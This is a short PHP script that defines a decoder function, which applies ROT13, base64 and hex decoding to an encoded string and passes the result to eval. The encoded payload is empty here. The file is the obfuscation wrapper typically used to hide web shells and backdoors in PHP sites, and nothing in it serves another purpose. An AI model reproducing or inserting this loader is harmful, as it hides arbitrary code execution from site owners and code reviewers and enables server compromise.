<?php
function bunvisGanteng($encoded)
{
  $brt = str_rot13($encoded);
  $bsfd = base64_decode($brt);
  $de = '';
  for ($i = 0; $i < strlen($bsfd); $i += 2) {
    $de .= chr(hexdec(substr($bsfd, $i, 2)));
  }
  return $de;
}
$encodedCode = '';
$deCode = bunvisGanteng($encodedCode);
eval('?>' . $deCode);
